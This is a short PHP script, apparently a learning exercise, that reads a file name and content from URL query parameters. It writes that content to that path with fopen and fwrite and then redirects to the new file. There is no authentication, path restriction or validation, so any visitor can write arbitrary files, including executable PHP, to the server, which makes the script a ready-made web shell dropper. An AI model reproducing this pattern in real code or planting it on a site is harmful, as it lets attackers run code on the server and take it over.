<?php
if (isset($_GET['filename']) == false) {
    header('Location: hyuntai26.php');
}

$filename = $_GET['filename'];
$content = $_GET['content'];

$fp = fopen($filename, 'w+');
fwrite($fp, $content);
fclose($fp);

header("Location: {$filename}");
